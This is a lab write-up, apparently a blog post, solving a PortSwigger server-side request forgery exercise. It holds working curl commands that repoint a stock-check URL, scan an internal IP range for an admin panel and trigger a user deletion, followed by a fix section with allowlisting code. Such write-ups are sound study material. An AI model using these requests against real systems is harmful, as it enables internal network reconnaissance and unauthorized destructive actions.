---
layout: post
title: "Basic SSRF Against Another Back-End System"
date: 2027-08-20 09:00:00 -0500
categories: [PortSwigger, SSRF]
tags: [ssrf, cwe-918, internal-network, port-scan, server-side-request-forgery]
---

## Overview

A "Check stock" feature sends a `stockApi` field that contains an **entire URL**, which the application fetches server-side. That makes it a Server-Side Request Forgery (SSRF) primitive: repoint the URL and the server requests whatever you name. In this lab the goal is to reach an admin interface living on a *different* internal host and delete the user `carlos`.

This is the harder sibling of "Basic SSRF against the local server" — here the admin interface is not on `localhost`, so you must scan an internal IP range to find it first.

---

## The Vulnerability

**CWE-918 — Server-Side Request Forgery**

The stock-check form ships a full URL as the value:

```html
<select name="stockApi">
  <option value="http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1">London</option>
</select>
```

The client controls the whole URL, and the server fetches it and returns the response. No host restriction = SSRF.

---

## Exploit

### 1. Confirm the server-side fetch

```bash
curl -sk -X POST $BASE/product/stock \
  --data-urlencode 'stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1'
# -> 131   (stock count; 192.168.0.1 is the stock backend)
```

### 2. Scan the internal range for the admin host

`192.168.0.1:8080/admin` returns `400` — the stock backend has no admin panel. The admin interface is on a different host in `192.168.0.0/24`. Use the HTTP status as a discovery oracle:

```bash
for i in $(seq 1 255); do
  code=$(curl -sk --max-time 10 -X POST $BASE/product/stock \
    --data-urlencode "stockApi=http://192.168.0.$i:8080/admin" \
    -o /tmp/r -w "%{http_code}")
  [ "$code" = 200 ] && echo "192.168.0.$i -> 200" && break
done
# -> 192.168.0.29 -> 200   (admin interface)
```

Dead and non-admin hosts time out or return 500/400; the admin host returns **200** with the panel HTML.

### 3. Confirm the delete path, then fire it

```bash
curl -sk -X POST $BASE/product/stock --data-urlencode 'stockApi=http://192.168.0.29:8080/admin'
# HTML: <a href=".../admin/delete?username=carlos">Delete</a>

curl -sk -X POST $BASE/product/stock \
  --data-urlencode 'stockApi=http://192.168.0.29:8080/admin/delete?username=carlos'
# -> [HTTP 302]   action executed; lab solved
```

---

## Why It Worked

The admin interface relies on **network-level access control** — it trusts any request coming from inside `192.168.0.0/24`. The application server is inside that network, so its outbound SSRF requests inherit that trust. Because the admin host differs from the stock backend, the HTTP status code became a host-discovery oracle, turning the stock-check feature into a one-line internal network scanner.

---

## The Fix

```java
// Never accept a full URL for a server-side fetch.
// Accept an opaque store id, build the URL from a fixed server-side allowlist.
String store = request.getParameter("storeId");
String url = BACKENDS.get(store);   // allowlist map; null -> reject
if (url == null) { response.setStatus(400); return; }
HttpResponse r = httpClient.execute(new HttpGet(url));
```

- Don't let clients supply URLs for server-side requests — use an opaque id mapped to a server-side allowlist.
- If a URL must be accepted, enforce a strict scheme+host+port allowlist after DNS resolution and re-validate every redirect.
- Deny private/loopback/link-local ranges (including alternate encodings like `0.0.0.0`, decimal, `127.1`).
- Never use network origin alone to authorize admin actions — require real authentication.
